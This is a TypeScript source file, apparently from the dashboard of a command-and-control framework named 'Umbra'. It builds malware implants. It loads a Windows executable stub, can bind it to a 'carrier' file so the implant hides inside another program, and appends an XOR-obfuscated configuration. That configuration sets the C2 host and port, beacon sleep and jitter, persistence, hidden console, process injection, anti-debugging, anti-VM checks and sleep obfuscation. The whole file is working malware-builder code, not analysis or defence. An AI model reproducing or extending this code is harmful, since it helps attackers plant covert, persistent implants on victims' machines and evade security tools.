const CFG_MAGIC = new Uint8Array([0x61, 0x72, 0x67, 0x70, 0x01, 0x70, 0x75, 0x74])
const FILE_MAGIC = new Uint8Array([0x55, 0x4d, 0x42, 0x52, 0x41, 0x46, 0x31, 0x00]) // UMBRAF1

export type WrapConfig = {
  ServerHost: string
  ServerPort: number
  UseTLS?: boolean
  EncryptionKey?: string
  EncryptedComms?: boolean
  ProcessInjection?: boolean
  InjectionMethod?: string
  CustomConfig?: string
  AntiDebug?: boolean
  AntiVM?: boolean
  SleepObfuscation?: boolean
  Persistence?: boolean
  HideConsole?: boolean
  SleepInterval?: number
  Jitter?: number
}

function esc(s: string): string {
  return JSON.stringify(s ?? '')
}

function tf(v: boolean | undefined, fallback = false): string {
  return (v ?? fallback) ? 'true' : 'false'
}

export function marshalTrailer(cfg: WrapConfig): Uint8Array {
  const port = String(cfg.ServerPort || 443)
  const useTls = cfg.UseTLS || port === '443' ? 'true' : 'false'
  const key = cfg.EncryptedComms === false ? '' : (cfg.EncryptionKey || '')
  const inj = cfg.ProcessInjection ? (cfg.InjectionMethod || 'crt') : 'none'
  const sleep = String(cfg.SleepInterval && cfg.SleepInterval > 0 ? cfg.SleepInterval : 15)
  const jit = String(cfg.Jitter != null && cfg.Jitter >= 0 ? cfg.Jitter : 20)
  const json =
    `{"c2_host":${esc(cfg.ServerHost)},"c2_port":${esc(port)},"use_tls":${esc(useTls)},` +
    `"sleep_interval":${esc(sleep)},"jitter":${esc(jit)},"persistence":${esc(tf(cfg.Persistence, false))},` +
    `"hide_console":${esc(tf(cfg.HideConsole, true))},"key":${esc(key)},"injection_method":${esc(inj)},` +
    `"anti_debug":${esc(tf(cfg.AntiDebug, false))},"anti_vm":${esc(tf(cfg.AntiVM, false))},` +
    `"sleep_obfuscation":${esc(tf(cfg.SleepObfuscation, false))}}`
  return new TextEncoder().encode(json)
}

function xorBody(json: Uint8Array): Uint8Array {
  const enc = new Uint8Array(json.length)
  for (let i = 0; i < json.length; i++) {
    enc[i] = json[i] ^ ((0x5a + (12 + i)) & 0xff)
  }
  return enc
}

function findMagic(buf: Uint8Array, magic: Uint8Array, fromEnd = true): number {
  const n = buf.length
  if (n < magic.length + 4) return -1
  const window = Math.min(8192, n)
  if (fromEnd) {
    for (let off = magic.length; off <= window; off++) {
      const i = n - off
      if (i + magic.length + 4 > n) continue
      let match = true
      for (let k = 0; k < magic.length; k++) {
        if (buf[i + k] !== magic[k]) { match = false; break }
      }
      if (match) return i
    }
    return -1
  }
  for (let i = 0; i + magic.length + 4 <= n; i++) {
    let match = true
    for (let k = 0; k < magic.length; k++) {
      if (buf[i + k] !== magic[k]) { match = false; break }
    }
    if (match) return i
  }
  return -1
}

function stripExistingTrailer(buf: Uint8Array): Uint8Array {
  const i = findMagic(buf, CFG_MAGIC, true)
  if (i < 0) return buf
  const ln = buf[i + 8] | (buf[i + 9] << 8) | (buf[i + 10] << 16) | (buf[i + 11] << 24)
  if (ln > 0 && ln <= 8192 && i + 12 + ln <= buf.length) return buf.subarray(0, i)
  return buf
}

function u32le(n: number): Uint8Array {
  const b = new Uint8Array(4)
  new DataView(b.buffer).setUint32(0, n >>> 0, true)
  return b
}

function concat(parts: Uint8Array[]): Uint8Array {
  let n = 0
  for (const p of parts) n += p.length
  const out = new Uint8Array(n)
  let o = 0
  for (const p of parts) { out.set(p, o); o += p.length }
  return out
}

export async function sha256Hex(bytes: Uint8Array): Promise<string> {
  const hash = await crypto.subtle.digest('SHA-256', bytes)
  return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('')
}

export async function loadStubBinary(): Promise<ArrayBuffer> {
  const urls = ['/umbra-stub.bin', './umbra-stub.bin']
  let last = ''
  for (const u of urls) {
    try {
      const r = await fetch(u, { cache: 'no-store' })
      if (!r.ok) { last = `${u} ${r.status}`; continue }
      const buf = await r.arrayBuffer()
      const head = new Uint8Array(buf, 0, 2)
      if (head[0] !== 0x4d || head[1] !== 0x5a) { last = `${u} not MZ`; continue }
      return buf
    } catch (e) {
      last = `${u} ${e instanceof Error ? e.message : 'fail'}`
    }
  }
  throw new Error(`stub missing (${last}). Rebuild the dashboard so umbra-stub.bin is in dist.`)
}

export function decryptTrailerJSON(patched: Uint8Array): string | null {
  const i = findMagic(patched, CFG_MAGIC, true)
  if (i < 0) return null
  const ln = patched[i + 8] | (patched[i + 9] << 8) | (patched[i + 10] << 16) | (patched[i + 11] << 24)
  if (ln <= 0 || ln > 8192 || i + 12 + ln > patched.length) return null
  const out = new Uint8Array(ln)
  for (let j = 0; j < ln; j++) out[j] = patched[i + 12 + j] ^ ((0x5a + (12 + j)) & 0xff)
  return new TextDecoder().decode(out)
}

export async function wrapAgentBinary(
  carrier: ArrayBuffer | null,
  stub: ArrayBuffer,
  cfg: WrapConfig,
): Promise<{ bytes: Uint8Array; json: string }> {
  const json = marshalTrailer(cfg)
  const enc = xorBody(json)
  let body = stripExistingTrailer(new Uint8Array(stub))
  if (carrier && carrier.byteLength > 0) {
    const raw = stripExistingTrailer(new Uint8Array(carrier))
    body = concat([body, FILE_MAGIC, u32le(raw.length), raw])
  }
  const out = concat([body, CFG_MAGIC, u32le(json.length), enc])
  return { bytes: out, json: new TextDecoder().decode(json) }
}
